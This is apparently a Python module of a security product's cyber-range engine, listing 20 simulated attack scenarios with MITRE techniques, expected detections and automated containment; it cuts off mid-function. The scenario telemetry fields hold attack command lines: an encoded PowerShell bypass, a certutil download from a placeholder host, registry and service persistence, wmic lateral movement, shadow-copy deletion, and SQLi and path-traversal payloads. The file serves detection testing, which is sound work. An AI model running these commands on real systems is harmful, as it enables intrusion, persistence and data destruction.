"""
[v3.0.0] Cyber Range & Adversary Simulation Engine
Orchestrates live, safe, multi-stage cyber attack simulations on fleet assets.
Executes MITRE ATT&CK techniques, validates detection triggers, and verifies autonomous SOAR containment.
Supports all 20 Phase 8.1 standardized attack simulations (SIM-001 through SIM-020).
"""

import json
import logging
from datetime import datetime, timedelta
from typing import Dict, Any, List, Optional
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy.future import select
from sqlalchemy import desc

from app.db.models import (
    CyberRangeScenario, CyberRangeRun, Agent, EventLog,
    DetectionAlert, DetectionRule, Incident, SoarPlaybook, SoarActionExecution
)
from app.services.risk_engine import calculate_risk_score
from app.services.soar_engine import soar_engine

logger = logging.getLogger("CyberRangeEngine")

STANDARDIZED_SCENARIOS = [
    {
        "code": "SIM-001",
        "aliases": ["BRUTE_FORCE"],
        "name": "Brute Force Authentication Storm",
        "category": "Credential Access",
        "severity": "High",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110.001 - Password Guessing"],
        "telemetry": "Rapid sequence of 45 failed logon attempts (EventLog 4625 / PAM auth failure) within 30s",
        "expected_detection": "Brute Force Authentication Surge",
        "expected_correlation": "Authentication Anomaly -> Identity Risk Surge",
        "expected_incident": "INC-SIM-001 (Distributed Authentication Brute Force)",
        "expected_ai_soc": "Identifies high-frequency failed authentications from single source IP targeting administrative accounts. Suggests IP ban & MFA challenge.",
        "expected_response": "Temporary firewall ban of source IP, lock affected user account, enforce step-up MFA.",
        "expected_soar": "Firewall IP Block & Account Temporary Lockout",
        "expected_final_state": "Source IP blacklisted on edge gateway, target account secured.",
        "stages": [
            {"step": 1, "action": "Rapid Authentication Probing", "detail": "45 failed logon packets dispatched to port 22/3389"},
            {"step": 2, "action": "Detection Rule Evaluation", "detail": "Sigma rule: Multiple Failed Logins in 60s matched"},
            {"step": 3, "action": "Correlation Engine Alert", "detail": "Threshold exceeded: Severity elevated to High"},
            {"step": 4, "action": "SOAR Enforcement", "detail": "Source IP placed in temporary perimeter blacklist"},
            {"step": 5, "action": "Verification", "detail": "Subsequent logon attempts dropped at ingress border"}
        ]
    },
    {
        "code": "SIM-002",
        "aliases": ["PASSWORD_SPRAYING"],
        "name": "Horizontal Password Spraying Campaign",
        "category": "Credential Access",
        "severity": "High",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1110.003 - Password Spraying"],
        "telemetry": "Single password attempt across 50 distinct domain accounts within 3 minutes",
        "expected_detection": "Low-and-Slow Password Spraying Pattern",
        "expected_correlation": "Fleet-wide Identity Horizon Correlation",
        "expected_incident": "INC-SIM-002 (Enterprise Password Spraying Ingress)",
        "expected_ai_soc": "Correlates low-frequency login attempts across heterogeneous domain users to detect coordinated spray.",
        "expected_response": "Force enterprise-wide password change, enforce Conditional Access policy.",
        "expected_soar": "Tenant-Wide Step-Up MFA Challenge Triggered",
        "expected_final_state": "Account spraying neutralized, identity verification required.",
        "stages": [
            {"step": 1, "action": "Low-and-Slow Probing", "detail": "Single credential spray across 50 unique account usernames"},
            {"step": 2, "action": "UEBA Identity Baseline Check", "detail": "Cross-user anomaly score increased by 42 points"},
            {"step": 3, "action": "Detection Alert Triggered", "detail": "Rule T1110.003 Password Spraying matched"},
            {"step": 4, "action": "SOAR Notification", "detail": "Automated security analyst paging and MFA challenge dispatched"},
            {"step": 5, "action": "Verification", "detail": "Conditional Access enforced fleet-wide"}
        ]
    },
    {
        "code": "SIM-003",
        "aliases": ["SUSPICIOUS_POWERSHELL"],
        "name": "Suspicious Obfuscated PowerShell Execution",
        "category": "Execution",
        "severity": "High",
        "mitre_tactics": ["Execution", "Defense Evasion"],
        "mitre_techniques": ["T1059.001 - PowerShell", "T1027 - Obfuscated Files"],
        "telemetry": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc V3JpdGUtSG9zdCAiTW9uaXRvcml4IFRlc3Qi",
        "expected_detection": "Suspicious Encoded PowerShell ScriptBlock Execution",
        "expected_correlation": "Execution -> Staging Download",
        "expected_incident": "INC-SIM-003 (Obfuscated LotL PowerShell Process)",
        "expected_ai_soc": "Decodes base64 scriptblock in-memory, discovers payload staging intent and execution policy bypass.",
        "expected_response": "Kill process tree, isolate host, capture volatile memory dump.",
        "expected_soar": "Terminate Process Tree & Host Network Isolation",
        "expected_final_state": "PID terminated, endpoint isolated from LAN.",
        "stages": [
            {"step": 1, "action": "Process Spawn", "detail": "powershell.exe spawned with -enc base64 payload"},
            {"step": 2, "action": "AMSI / ScriptBlock Interception", "detail": "Decoded payload matched against Sigma LotL rules"},
            {"step": 3, "action": "Detection Alert Created", "detail": "Rule: Suspicious PowerShell -enc Execution"},
            {"step": 4, "action": "SOAR Containment", "detail": "Killed process PID and isolated endpoint network stack"},
            {"step": 5, "action": "Verification", "detail": "Host confirmed in quarantine state, process halted"}
        ]
    },
    {
        "code": "SIM-004",
        "aliases": ["LOLBIN_EXECUTION"],
        "name": "Living-off-the-Land (LOLBin) Staging",
        "category": "Defense Evasion",
        "severity": "High",
        "mitre_tactics": ["Defense Evasion", "Command and Control"],
        "mitre_techniques": ["T1105 - Ingress Tool Transfer", "T1218 - System Binary Proxy Execution"],
        "telemetry": "certutil.exe -urlcache -split -f https://synthetic-payload.internal/loader.bin C:\\Windows\\Temp\\loader.bin",
        "expected_detection": "LOLBin Ingress Tool Transfer (Certutil/Mshta)",
        "expected_correlation": "Ingress Download -> Persistence Staging",
        "expected_incident": "INC-SIM-004 (Living-off-the-Land Binary Staging)",
        "expected_ai_soc": "Flags legitimate signed Windows binary abused for downloading remote executable.",
        "expected_response": "Quarantine downloaded binary artifact, block egress download URI.",
        "expected_soar": "Quarantine Dropped File & Block URL at Perimeter",
        "expected_final_state": "Dropped file removed from temp directory, certutil aborted.",
        "stages": [
            {"step": 1, "action": "CertUtil Invocation", "detail": "certutil.exe -urlcache invoked with external URI"},
            {"step": 2, "action": "FIM File Watcher Alert", "detail": "Unsigned binary created in C:\\Windows\\Temp\\loader.bin"},
            {"step": 3, "action": "Detection Rule Matched", "detail": "Rule: LOLBin Certutil Ingress Tool Transfer"},
            {"step": 4, "action": "Autonomous Quarantine", "detail": "loader.bin moved to encrypted quarantine vault"},
            {"step": 5, "action": "Verification", "detail": "Artifact neutralized, HashBank reputation marked Malicious"}
        ]
    },
    {
        "code": "SIM-005",
        "aliases": ["PERSISTENCE_RUNKEY"],
        "name": "Registry Run Key Autostart Persistence",
        "category": "Persistence",
        "severity": "Medium",
        "mitre_tactics": ["Persistence"],
        "mitre_techniques": ["T1547.001 - Registry Run Keys / Startup Folder"],
        "telemetry": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecAuditUpdater /t REG_SZ /d C:\\Users\\Public\\updater.exe /f",
        "expected_detection": "Registry Run Key Persistence Modification",
        "expected_correlation": "Execution -> Persistence Established",
        "expected_incident": "INC-SIM-005 (Autostart Persistence Established)",
        "expected_ai_soc": "Detects modification to startup run keys referencing untrusted user-writable directory.",
        "expected_response": "Delete unauthorized registry value, quarantine target executable.",
        "expected_soar": "Delete Registry Run Key & Purge Binary Artifact",
        "expected_final_state": "Persistence key erased, system startup integrity restored.",
        "stages": [
            {"step": 1, "action": "Registry Key Injection", "detail": "HKCU Run key created pointing to C:\\Users\\Public\\updater.exe"},
            {"step": 2, "action": "Kernel Registry Filter Alert", "detail": "Registry write event intercepted by Monitorix agent"},
            {"step": 3, "action": "Detection Triggered", "detail": "Rule: Unauthorized Run Key Persistence Mutation"},
            {"step": 4, "action": "SOAR Remediation", "detail": "Automated playbook deletes registry entry and scrubs disk"},
            {"step": 5, "action": "Verification", "detail": "Registry key verified clean, zero persistence residual"}
        ]
    },
    {
        "code": "SIM-006",
        "aliases": ["PRIVILEGE_ESCALATION"],
        "name": "UAC Bypass & Privilege Escalation",
        "category": "Privilege Escalation",
        "severity": "Critical",
        "mitre_tactics": ["Privilege Escalation", "Defense Evasion"],
        "mitre_techniques": ["T1548.002 - Bypass User Account Control"],
        "telemetry": "fodhelper.exe registry hijack spawning elevated cmd.exe with High Integrity Level without UAC prompt",
        "expected_detection": "UAC Bypass via Fodhelper / Eventvwr Registry Hijack",
        "expected_correlation": "Low-Priv Execution -> Elevated Admin Shell",
        "expected_incident": "INC-SIM-006 (Unauthorized Privilege Escalation to SYSTEM)",
        "expected_ai_soc": "Traces parent Medium-integrity process spawning High-integrity child bypassing security dialogs.",
        "expected_response": "Terminate elevated child process, isolate host, alert SOC.",
        "expected_soar": "Terminate Elevated Child Shell & Host Isolation",
        "expected_final_state": "Elevated shell killed, host placed in containment.",
        "stages": [
            {"step": 1, "action": "Registry Mock Hijack", "detail": "HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command set"},
            {"step": 2, "action": "Fodhelper Execution", "detail": "fodhelper.exe launched to trigger autoelevate bypass"},
            {"step": 3, "action": "Integrity Surge Detected", "detail": "High-integrity cmd.exe spawned without prompt"},
            {"step": 4, "action": "SOAR Interception", "detail": "Elevated PID terminated, registry hijack key cleared"},
            {"step": 5, "action": "Verification", "detail": "Host privilege baseline verified at standard user level"}
        ]
    },
    {
        "code": "SIM-007",
        "aliases": ["CREDENTIAL_ACCESS_LSASS"],
        "name": "LSASS Memory Credential Access Attempt",
        "category": "Credential Access",
        "severity": "Critical",
        "mitre_tactics": ["Credential Access"],
        "mitre_techniques": ["T1003.001 - LSASS Memory Dumping"],
        "telemetry": "lsass.exe handle opened with PROCESS_VM_READ permissions by suspicious non-system PID 4912",
        "expected_detection": "LSASS Memory Access / Mimikatz Dumping Heuristic",
        "expected_correlation": "Execution -> Credential Access Attempt",
        "expected_incident": "INC-SIM-007 (LSASS Credential Harvesting In-Memory)",
        "expected_ai_soc": "Identifies unauthorized process attempting to read Local Security Authority memory for NTLM/Kerberos secrets.",
        "expected_response": "Immediately isolate host, terminate accessing process, rotate domain credentials.",
        "expected_soar": "Host Network Isolation & Process Termination",
        "expected_final_state": "Host isolated, memory dump preserved for evidence, process killed.",
        "stages": [
            {"step": 1, "action": "Process Handle Request", "detail": "PID 4912 requested PROCESS_VM_READ handle to lsass.exe"},
            {"step": 2, "action": "Kernel Object Hook Trigger", "detail": "Monitorix EDR driver intercepted handle creation"},
            {"step": 3, "action": "Detection Alert Generated", "detail": "Rule: LSASS Memory Handle Opened by Untrusted Process"},
            {"step": 4, "action": "SOAR Containment", "detail": "Process terminated immediately and host isolated"},
            {"step": 5, "action": "Verification", "detail": "Zero credentials leaked, memory protection verified"}
        ]
    },
    {
        "code": "SIM-008",
        "aliases": ["PROCESS_INJECTION"],
        "name": "Suspicious Process Memory Injection",
        "category": "Defense Evasion",
        "severity": "Critical",
        "mitre_tactics": ["Defense Evasion", "Privilege Escalation"],
        "mitre_techniques": ["T1055.001 - Dynamic-link Library Injection", "T1055.002 - Portable Executable Injection"],
        "telemetry": "VirtualAllocEx + WriteProcessMemory + CreateRemoteThread targeting explorer.exe (PID 2104)",
        "expected_detection": "Process Injection / Cross-Process Memory Write",
        "expected_correlation": "Defense Evasion -> In-Memory Staging",
        "expected_incident": "INC-SIM-008 (Process Injection into Legitimate Host Process)",
        "expected_ai_soc": "Detects remote thread creation and PAGE_EXECUTE_READWRITE memory allocation inside legitimate system process.",
        "expected_response": "Suspend remote thread, capture forensic memory dump, terminate injector PID.",
        "expected_soar": "Capture Memory Dump & Terminate Injecting Process",
        "expected_final_state": "Injector terminated, memory dump stored in S3 forensic vault.",
        "stages": [
            {"step": 1, "action": "Memory Allocation", "detail": "VirtualAllocEx allocated RWX memory block in explorer.exe"},
            {"step": 2, "action": "Buffer Write Intercept", "detail": "WriteProcessMemory transferred 4096 bytes of shellcode"},
            {"step": 3, "action": "CreateRemoteThread Alert", "detail": "Rule: Cross-Process Remote Thread Creation triggered"},
            {"step": 4, "action": "Forensic Vault Dispatch", "detail": "Memory snapshot captured and uploaded to MinIO"},
            {"step": 5, "action": "Verification", "detail": "Injected thread suspended, system process stabilized"}
        ]
    },
    {
        "code": "SIM-009",
        "aliases": ["MALICIOUS_SERVICE"],
        "name": "Malicious Windows Service Installation",
        "category": "Persistence",
        "severity": "High",
        "mitre_tactics": ["Persistence", "Privilege Escalation"],
        "mitre_techniques": ["T1543.003 - Windows Service"],
        "telemetry": "sc.exe create SecAuditService binPath= \"C:\\Windows\\Temp\\svc_backdoor.exe\" start= auto",
        "expected_detection": "Suspicious Service Creation in Temp Directory",
        "expected_correlation": "Persistence -> System Autostart",
        "expected_incident": "INC-SIM-009 (Unsigned System Service Installation)",
        "expected_ai_soc": "Evaluates service binary location and unquoted service path vulnerability in administrative path.",
        "expected_response": "Stop service, delete service entry, quarantine binary.",
        "expected_soar": "Stop Service, Delete Registry Entry & Quarantine Binary",
        "expected_final_state": "Service uninstalled, binary quarantined, zero persistence remaining.",
        "stages": [
            {"step": 1, "action": "Service Registration", "detail": "sc.exe create executed for SecAuditService pointing to Temp folder"},
            {"step": 2, "action": "Service Control Manager Intercept", "detail": "Monitorix agent logged event 7045 (New Service Created)"},
            {"step": 3, "action": "Detection Alert Created", "detail": "Rule: Suspicious Service Path in Temporary Folder"},
            {"step": 4, "action": "SOAR Playbook Execution", "detail": "Service stopped and deleted from SCM via net stop/sc delete"},
            {"step": 5, "action": "Verification", "detail": "SCM query confirms SecAuditService does not exist"}
        ]
    },
    {
        "code": "SIM-010",
        "aliases": ["C2_NETWORK_BEACONING"],
        "name": "Command & Control (C2) Periodic Beaconing",
        "category": "Command and Control",
        "severity": "Critical",
        "mitre_tactics": ["Command and Control"],
        "mitre_techniques": ["T1071.001 - Web Protocols", "T1573 - Encrypted Channel"],
        "telemetry": "Periodic outbound HTTPS sessions to 185.220.101.42:443 with jitter +/- 5% every 30 seconds",
        "expected_detection": "Periodic C2 Beaconing Heuristic Pattern",
        "expected_correlation": "Process Execution -> External Communication",
        "expected_incident": "INC-SIM-010 (Active Command & Control Communication)",
        "expected_ai_soc": "Threat intel correlation matches destination IP with known Cobalt Strike Team Server.",
        "expected_response": "Network egress block, host isolation, firewall policy update.",
        "expected_soar": "Host Network Isolation & IP Perimeter Blacklist",
        "expected_final_state": "Outbound connection blocked, host isolated.",
        "stages": [
            {"step": 1, "action": "Beacon Dispatched", "detail": "Outbound TLS sessions to 185.220.101.42 logged every 30s"},
            {"step": 2, "action": "Jitter & Periodicity Analysis", "detail": "Statistical regularity score calculated: 0.96 (High Confidence)"},
            {"step": 3, "action": "Threat Intel Match", "detail": "IP flagged in Threat Bank as Active Cobalt Strike C2"},
            {"step": 4, "action": "SOAR Host Isolation", "detail": "Host isolated and firewall egress rule dispatched"},
            {"step": 5, "action": "Verification", "detail": "Zero network packets escaping host boundary"}
        ]
    },
    {
        "code": "SIM-011",
        "aliases": ["DNS_TUNNELING"],
        "name": "Covert DNS Data Tunneling & Exfiltration",
        "category": "Command and Control",
        "severity": "High",
        "mitre_tactics": ["Command and Control", "Exfiltration"],
        "mitre_techniques": ["T1071.004 - DNS", "T1048 - Exfiltration Over Alternative Protocol"],
        "telemetry": "High-frequency TXT/NULL DNS queries to *.data.tunnel-domain.net with base32 encoded labels",
        "expected_detection": "DNS Data Tunneling / High-Entropy Query Surge",
        "expected_correlation": "Network Anomaly -> Exfiltration Channel",
        "expected_incident": "INC-SIM-011 (Covert DNS Tunnel Exfiltration)",
        "expected_ai_soc": "Analyzes DNS request length, subdomain entropy > 4.8, and high request rate per second.",
        "expected_response": "Sinkhole domain at internal resolver, isolate sending endpoint.",
        "expected_soar": "Sinkhole Malicious Domain & Host Isolation",
        "expected_final_state": "Domain sinkholed, DNS queries redirected to local blackhole.",
        "stages": [
            {"step": 1, "action": "DNS Queries Burst", "detail": "80 high-entropy TXT requests dispatched to tunnel-domain.net"},
            {"step": 2, "action": "Entropy & Length Monitor", "detail": "Subdomain entropy flagged: 4.92 / 5.0"},
            {"step": 3, "action": "Detection Alert Triggered", "detail": "Rule: DNS Tunneling Exfiltration Signature"},
            {"step": 4, "action": "SOAR Domain Sinkhole", "detail": "Root domain null-routed across all DNS forwarders"},
            {"step": 5, "action": "Verification", "detail": "DNS response NXDOMAIN returned for malicious root"}
        ]
    },
    {
        "code": "SIM-012",
        "aliases": ["LATERAL_MOVEMENT"],
        "name": "Lateral Movement via Remote WMI & SMB",
        "category": "Lateral Movement",
        "severity": "High",
        "mitre_tactics": ["Lateral Movement"],
        "mitre_techniques": ["T1047 - Windows Management Instrumentation", "T1021.002 - SMB/Windows Admin Shares"],
        "telemetry": "wmic.exe /node:\"192.168.1.105\" process call create \"cmd.exe /c whoami\" via port 135/445",
        "expected_detection": "Remote WMI / SMB Process Execution Across Endpoints",
        "expected_correlation": "Internal Pivot -> Lateral Movement Chain",
        "expected_incident": "INC-SIM-012 (Internal Lateral Movement via WMI)",
        "expected_ai_soc": "Traces pivot trajectory from source workstation to internal target server.",
        "expected_response": "Isolate source and target endpoints, terminate remote WMI session.",
        "expected_soar": "Host Isolation on Pivot Source & Target Workstation",
        "expected_final_state": "Lateral movement arrested, internal network microsegmented.",
        "stages": [
            {"step": 1, "action": "RPC/WMI Handshake", "detail": "wmic.exe initiated RPC session to 192.168.1.105:135"},
            {"step": 2, "action": "Remote Process Spawn", "detail": "WmiPrvSE.exe on target spawned cmd.exe whoami"},
            {"step": 3, "action": "Detection Rule Matched", "detail": "Rule: Remote WMI Process Invocation (T1047)"},
            {"step": 4, "action": "SOAR Dual-Host Isolation", "detail": "Source and destination endpoints placed in quarantine"},
            {"step": 5, "action": "Verification", "detail": "RPC port 135/445 traffic blocked between fleet assets"}
        ]
    },
    {
        "code": "SIM-013",
        "aliases": ["SUSPICIOUS_FILE_MOD"],
        "name": "System Hosts File Tampering & Redirection",
        "category": "Defense Evasion",
        "severity": "High",
        "mitre_tactics": ["Defense Evasion", "Impact"],
        "mitre_techniques": ["T1565.001 - Stored Data Manipulation"],
        "telemetry": "Direct write to C:\\Windows\\System32\\drivers\\etc\\hosts mapping security update domains to 127.0.0.1",
        "expected_detection": "Critical System File Integrity Violation (FIM)",
        "expected_correlation": "FIM Alert -> Defense Evasion",
        "expected_incident": "INC-SIM-013 (System Hosts File Hijack / Tampering)",
        "expected_ai_soc": "Identifies malicious redirection of security update telemetry to local loopback.",
        "expected_response": "Revert hosts file to golden image, isolate agent.",
        "expected_soar": "Restore File from Golden Vault & Quarantine Process",
        "expected_final_state": "Hosts file restored to original cryptographic hash.",
        "stages": [
            {"step": 1, "action": "FIM Write Event", "detail": "hosts file opened for writing by untrusted PID"},
            {"step": 2, "action": "Hash Divergence Detected", "detail": "FIM engine detected SHA256 mismatch vs golden hash"},
            {"step": 3, "action": "Detection Alert Generated", "detail": "Rule: Critical System Configuration File Tamper"},
            {"step": 4, "action": "SOAR File Restoration", "detail": "Golden hosts file template restored from MinIO"},
            {"step": 5, "action": "Verification", "detail": "File integrity verified: SHA256 matches verified baseline"}
        ]
    },
    {
        "code": "SIM-014",
        "aliases": ["RANSOMWARE_ACTIVITY", "RANSOMWARE_BLAST"],
        "name": "Ransomware Canary Trigger & Volume Shadow Wipe",
        "category": "Impact",
        "severity": "Critical",
        "mitre_tactics": ["Impact"],
        "mitre_techniques": ["T1486 - Data Encrypted for Impact", "T1490 - Inhibit System Recovery"],
        "telemetry": "vssadmin.exe delete shadows /all /quiet + 148 high-entropy file modifications in 400ms + Canary breach",
        "expected_detection": "Ransomware Inhibit Recovery + Canary Guard Breach",
        "expected_correlation": "Recovery Invalidation -> Mass Encryption Burst",
        "expected_incident": "INC-SIM-014 (Active Ransomware Outbreak Detected)",
        "expected_ai_soc": "Canary token tripped, high entropy observed across user documents. Recommends immediate isolation.",
        "expected_response": "Immediate emergency host network isolation, process tree kill.",
        "expected_soar": "Host Network Isolation & Kill Ransomware Process Tree",
        "expected_final_state": "Host isolated in <1.5s, encryptor terminated, shadow copy protection restored.",
        "stages": [
            {"step": 1, "action": "Canary Token Tamper", "detail": "Canary document .canary_token_alphv.docx modified"},
            {"step": 2, "action": "VSS Wiping Intercepted", "detail": "vssadmin.exe delete shadows command blocked"},
            {"step": 3, "action": "Entropy Surge Alert", "detail": "148 files altered with high entropy in 400ms"},
            {"step": 4, "action": "Autonomous SOAR Isolation", "detail": "Host isolated immediately from enterprise network"},
            {"step": 5, "action": "Verification", "detail": "Process tree terminated, zero unencrypted files lost"}
        ]
    },
    {
        "code": "SIM-015",
        "aliases": ["DATA_EXFILTRATION"],
        "name": "High-Volume HTTPS Data Exfiltration",
        "category": "Exfiltration",
        "severity": "High",
        "mitre_tactics": ["Exfiltration"],
        "mitre_techniques": ["T1567.002 - Exfiltration to Cloud Storage"],
        "telemetry": "500MB outbound POST burst to unclassified mega.nz / cloud storage API endpoint",
        "expected_detection": "High-Volume Data Exfiltration Burst (DLP/Network)",
        "expected_correlation": "Sensitive Document Read -> Network Outflow Surge",
        "expected_incident": "INC-SIM-015 (High Volume Cloud Data Exfiltration)",
        "expected_ai_soc": "Correlates local archive creation of confidential documents with massive outbound network transfer.",
        "expected_response": "Block destination cloud storage IP, suspend user API tokens.",
        "expected_soar": "Revoke Cloud Token & Throttle Network Port to 0",
        "expected_final_state": "Network bandwidth throttled, exfiltration socket severed.",
        "stages": [
            {"step": 1, "action": "Confidential Zip Created", "detail": "archive_financials.zip created from C:\\Data\\Finance"},
            {"step": 2, "action": "Outbound POST Transfer", "detail": "450MB stream dispatched to mega.io via port 443"},
            {"step": 3, "action": "DLP Network Trigger", "detail": "Rule: Outbound Exfiltration Threshold Exceeded (>100MB)"},
            {"step": 4, "action": "SOAR Throttling Playbook", "detail": "Network adapter bandwidth throttled to 0 KB/s"},
            {"step": 5, "action": "Verification", "detail": "Socket closed, transfer aborted, incident escalated"}
        ]
    },
    {
        "code": "SIM-016",
        "aliases": ["INSIDER_MISUSE", "INSIDER_EXFILTRATION"],
        "name": "Insider Misuse & Removable Media Exfiltration",
        "category": "Insider Threat",
        "severity": "High",
        "mitre_tactics": ["Exfiltration", "Collection"],
        "mitre_techniques": ["T1052.001 - Exfiltration to Removable Media", "T1083 - File Discovery"],
        "telemetry": "USB storage plugged + bulk copy of payroll_2026_Q1.xlsx containing SSN/salary patterns",
        "expected_detection": "Removable Media DLP Policy Violation",
        "expected_correlation": "USB Mount -> Confidential Document Copy",
        "expected_incident": "INC-SIM-016 (Insider Removable Storage Exfiltration)",
        "expected_ai_soc": "Flags user behavior diverging 4.2 standard deviations from peer baseline. Suggests bus lock.",
        "expected_response": "Lock USB bus, revoke write permissions, notify compliance team.",
        "expected_soar": "Removable Storage Bus Lockout & File Quarantine",
        "expected_final_state": "Removable drive unmounted, write permissions revoked.",
        "stages": [
            {"step": 1, "action": "USB Media Insertion", "detail": "SanDisk Cruzer USB device mounted on drive E:\\"},
            {"step": 2, "action": "Confidential File Access", "detail": "payroll_2026_Q1.xlsx opened from internal network share"},
            {"step": 3, "action": "DLP Content Pattern Match", "detail": "SSN & Salary columns detected in copy stream"},
            {"step": 4, "action": "SOAR USB Bus Lock", "detail": "USB mass storage driver write-disabled via EDR policy"},
            {"step": 5, "action": "Verification", "detail": "E:\\ marked read-only, DLP audit log sealed in vault"}
        ]
    },
    {
        "code": "SIM-017",
        "aliases": ["WEB_API_ATTACK"],
        "name": "Web Application & API Gateway Exploitation",
        "category": "Initial Access",
        "severity": "Critical",
        "mitre_tactics": ["Initial Access"],
        "mitre_techniques": ["T1190 - Exploit Public-Facing Application"],
        "telemetry": "HTTP POST /api/v1/auth with SQLi (' OR '1'='1) and path traversal (../../etc/passwd)",
        "expected_detection": "WAF & API Gateway SQLi / Path Traversal Exploit Pattern",
        "expected_correlation": "Perimeter Probe -> Exploitation Attempt",
        "expected_incident": "INC-SIM-017 (Automated SQLi & Path Traversal Attack)",
        "expected_ai_soc": "Pinpoints malicious URI parameters targeting database abstraction layer.",
        "expected_response": "Rate-limit and ban client IP, patch vulnerable parameter handling.",
        "expected_soar": "Dynamic WAF Rule Injection & Client IP Ban",
        "expected_final_state": "Client IP blocked at API gateway with 403 Forbidden.",
        "stages": [
            {"step": 1, "action": "SQLi Probe Dispatched", "detail": "POST /api/v1/auth sent with SQL injection payload"},
            {"step": 2, "action": "Path Traversal Vector", "detail": "GET /api/v1/download?file=../../etc/passwd sent"},
            {"step": 3, "action": "WAF Detection Triggered", "detail": "Rule: OWASP A03 Injection & Path Traversal Violation"},
            {"step": 4, "action": "SOAR Edge Ban", "detail": "Client IP added to Nginx dynamic deny list"},
            {"step": 5, "action": "Verification", "detail": "Subsequent API requests drop with 403 Forbidden"}
        ]
    },
    {
        "code": "SIM-018",
        "aliases": ["PHISHING_TELEMETRY"],
        "name": "Weaponized Phishing Email & Macro Dropper",
        "category": "Initial Access",
        "severity": "High",
        "mitre_tactics": ["Initial Access"],
        "mitre_techniques": ["T1566.001 - Spearphishing Attachment"],
        "telemetry": "Inbound email 'Urgent Invoice' with macro attachment invoice_9941.xlsm containing VBA AutoOpen",
        "expected_detection": "Weaponized Macro Attachment / Spearphishing Attachment",
        "expected_correlation": "Email Forensics -> Detonation Sandbox",
        "expected_incident": "INC-SIM-018 (Weaponized Office Macro Email Ingress)",
        "expected_ai_soc": "Detonation sandbox detects VBA AutoOpen downloading staging DLL. Recommends fleet mailbox purge.",
        "expected_response": "Purge email from all mailboxes, block sender domain.",
        "expected_soar": "Fleet-Wide Mailbox Purge & Sender Domain Blacklist",
        "expected_final_state": "Email removed from mailboxes, sender domain blacklisted.",
        "stages": [
            {"step": 1, "action": "Email Inbound Ingress", "detail": "Email received from attacker@spoofed-vendor.com"},
            {"step": 2, "action": "Sandbox Detonation", "detail": "Attachment detonated in Monitorix Native Sandbox VM"},
            {"step": 3, "action": "Macro Heuristic Alert", "detail": "VBA AutoOpen script matched malware signature"},
            {"step": 4, "action": "SOAR Mailbox Purge", "detail": "Message ID purged across all tenant mail accounts"},
            {"step": 5, "action": "Verification", "detail": "Message retrieval returns zero instances in inbox lake"}
        ]
    },
    {
        "code": "SIM-019",
        "aliases": ["ACCOUNT_COMPROMISE"],
        "name": "Account Compromise & Impossible Travel",
        "category": "Credential Access",
        "severity": "Critical",
        "mitre_tactics": ["Credential Access", "Initial Access"],
        "mitre_techniques": ["T1078 - Valid Accounts"],
        "telemetry": "Impossible travel: User authenticated from London (82.165.197.1) and 12m later from Tokyo (133.242.18.5)",
        "expected_detection": "UEBA Impossible Travel & Concurrent Session Anomaly",
        "expected_correlation": "Identity Anomaly -> Account Takeover",
        "expected_incident": "INC-SIM-019 (Account Takeover via Impossible Travel)",
        "expected_ai_soc": "Flags geographic velocity requirement > 3,800 km/h between authentication tokens.",
        "expected_response": "Invalidate all active refresh tokens, trigger step-up biometric auth.",
        "expected_soar": "Terminate All Active User Sessions & Require Password Reset",
        "expected_final_state": "Sessions revoked, account locked until identity proofing.",
        "stages": [
            {"step": 1, "action": "Initial Authentication", "detail": "Valid logon from London, UK (IP 82.165.197.1)"},
            {"step": 2, "action": "Divergent Authentication", "detail": "Valid logon 12m later from Tokyo, Japan (IP 133.242.18.5)"},
            {"step": 3, "action": "UEBA Geo-Velocity Anomaly", "detail": "Calculated travel velocity: 4,750 km/h (Impossible Travel)"},
            {"step": 4, "action": "SOAR Session Revocation", "detail": "JWT refresh tokens revoked, sessions terminated"},
            {"step": 5, "action": "Verification", "detail": "Subsequent API requests reject with 401 Unauthorized"}
        ]
    },
    {
        "code": "SIM-020",
        "aliases": ["MULTI_STAGE_CHAIN", "MONITORIX_PERIMETER_LOTL", "REDRAINBOW_PERIMETER_LOTL"],
        "name": "Coordinated Multi-Stage APT Attack Chain",
        "category": "Complex Multi-Stage Attack",
        "severity": "Critical",
        "mitre_tactics": ["Initial Access", "Execution", "Credential Access", "Lateral Movement", "Impact"],
        "mitre_techniques": ["T1133 - External Services", "T1059.001 - PowerShell", "T1003.001 - LSASS", "T1047 - WMI", "T1486 - Encryption"],
        "telemetry": "Perimeter Ingress -> PowerShell Stager -> LSASS Memory Read -> WMI Lateral Spread -> Ransomware Canary",
        "expected_detection": "Correlated Multi-Stage Kill Chain (Initial Access to Impact)",
        "expected_correlation": "Full 5-stage attack chain correlation in Security Graph",
        "expected_incident": "INC-SIM-020 (Advanced Multi-Stage Intrusion Campaign)",
        "expected_ai_soc": "Correlates telemetry across multiple endpoints, reconstructs root cause to perimeter ingress.",
        "expected_response": "Complete fleet containment playbook, enterprise password reset, forensic image capture.",
        "expected_soar": "Coordinated Multi-Host Isolation & Automated Kill Chain Teardown",
        "expected_final_state": "Target assets isolated, malicious processes terminated, full chain logged in Security Graph.",
        "stages": [
            {"step": 1, "action": "Perimeter Ingress", "detail": "Authenticated tunnel ingress from external IP 203.0.113.45"},
            {"step": 2, "action": "PowerShell Memory Stager", "detail": "powershell.exe -enc launched in-memory loader"},
            {"step": 3, "action": "LSASS Handle Opened", "detail": "PROCESS_VM_READ access to lsass.exe intercepted"},
            {"step": 4, "action": "Lateral WMI Pivot", "detail": "wmic.exe process call create invoked across internal subnet"},
            {"step": 5, "action": "Canary & Encryption Burst", "detail": "Ransomware canary file breached and alert raised"},
            {"step": 6, "action": "Autonomous Multi-Host SOAR", "detail": "All compromised nodes isolated, processes terminated"}
        ]
    }
]

class CyberRangeEngine:

    async def ensure_scenarios_seeded(self, db: AsyncSession) -> None:
        """Ensures all 20 standardized scenarios are registered in the database."""
        result = await db.execute(select(CyberRangeScenario.ScenarioCode))
        existing_codes = set(result.scalars().all())

        new_count = 0
        for s in STANDARDIZED_SCENARIOS:
            code = s["code"]
            if code not in existing_codes:
                sc = CyberRangeScenario(
                    ScenarioCode=code,
                    Name=s["name"],
                    Description=f"Phase 8.1 Standardized Simulation: {s['name']}. Expected Detection: {s['expected_detection']}",
                    Category=s["category"],
                    Severity=s["severity"],
